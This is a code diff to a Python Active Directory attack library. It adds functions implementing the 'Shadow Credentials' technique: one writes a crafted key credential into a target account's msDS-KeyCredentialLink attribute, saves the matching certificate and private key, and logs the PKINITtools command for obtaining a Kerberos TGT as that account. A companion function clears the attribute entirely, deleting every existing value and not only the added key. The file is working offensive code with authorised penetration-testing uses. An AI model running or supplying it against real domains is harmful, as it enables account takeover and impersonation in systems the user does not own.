@@ -1,9 +1,15 @@
+import random
+import string
 import ldap3
 import impacket
 import logging
 from ldap3.protocol.formatters.formatters import format_sid
 from impacket.ldap import ldaptypes
 from impacket.dcerpc.v5 import samr, dtypes
+from dsinternals.system.Guid import Guid
+from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
+from dsinternals.system.DateTime import DateTime
+from dsinternals.common.data.hello.KeyCredential import KeyCredential
 
 from .exceptions import NoResultError, ResultError, TooManyResultsError
 
@@ -141,29 +147,6 @@ def cryptPassword(session_key, password):
     return sam_user_pass_enc
 
 
-def userAccountControl(conn, identity, enable, flag):
-    enable = enable == "True"
-    
-    conn = conn.getLdapConnection()
-    user_dn = resolvDN(conn, identity)
-    conn.search(user_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes='userAccountControl')
-    userAccountControl = conn.response[0]['attributes']['userAccountControl']
-    LOG.debug(f"Original userAccountControl: {userAccountControl}")
-
-    if enable:
-        userAccountControl = userAccountControl | flag
-    else:
-        userAccountControl = userAccountControl & ~flag
-
-    LOG.debug(f"Updated userAccountControl: {userAccountControl}")
-    conn.modify(user_dn, {'userAccountControl': (ldap3.MODIFY_REPLACE, [userAccountControl])})
-
-    if conn.result['result'] == 0:
-        LOG.info("Updated userAccountControl attribute successfully")
-    else:
-        raise ResultError(conn.result)
-
-
 def rpcChangePassword(conn, target, new_pass):
     """
     Change the target password without knowing the old one using RPC instead of LDAPS
@@ -246,5 +229,65 @@ def modifySecDesc(conn, identity, target,
     ldap_conn.modify(entry_dn, {ldap_attribute: [ldap3.MODIFY_REPLACE, attr_values]}, controls=controls)
     if ldap_conn.result['result'] == 0:
         return old_sd
+    else:
+        raise ResultError(ldap_conn.result)
+
+def addShadowCredentials(conn, identity, outfilePath=None):
+    """
+    Allow to authenticate as the user provided using a crafted certificate (Shadow Credentials)
+    Args:
+        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
+        outfilePath: file path for the generated certificate (default is current path)
+    """
+    ldap_conn = conn.getLdapConnection()
+    target_dn = resolvDN(ldap_conn, identity)
+
+    LOG.debug("Generating certificate")
+    certificate = X509Certificate2(subject=identity, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
+    LOG.debug("Certificate generated")
+    LOG.debug("Generating KeyCredential")
+    keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
+    LOG.debug("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
+    LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
+
+    ldap_conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['msDS-KeyCredentialLink'])
+
+    new_values = ldap_conn.response[0]['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
+    LOG.debug(new_values)
+    LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % identity)
+    ldap_conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
+    
+    if ldap_conn.result['result'] == 0:
+        LOG.debug("msDS-KeyCredentialLink attribute of the target object updated")
+        if outfilePath is None:
+            path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
+            LOG.info("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
+        else:
+            path = outfilePath
+
+        certificate.ExportPEM(path_to_files=path)
+        LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
+        LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
+        LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
+        LOG.info("Run the following command to obtain a TGT")
+        LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', identity, path))
+
+    else:
+        raise ResultError(ldap_conn.result)
+
+
+def delShadowCredentials(conn, identity):
+    """
+    Delete the crafted certificate (Shadow Credentials) from the msDS-KeyCredentialLink attribute of the user provided
+    Args:
+        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
+    """
+    ldap_conn = conn.getLdapConnection()
+    target_dn = resolvDN(ldap_conn, identity)
+
+    # TODO: remove only the public key corresponding to the certificate provided
+    ldap_conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, []]})
+    if ldap_conn.result['result'] == 0:
+        LOG.info("msDS-KeyCredentialLink attribute of the target object updated")
     else:
         raise ResultError(ldap_conn.result)
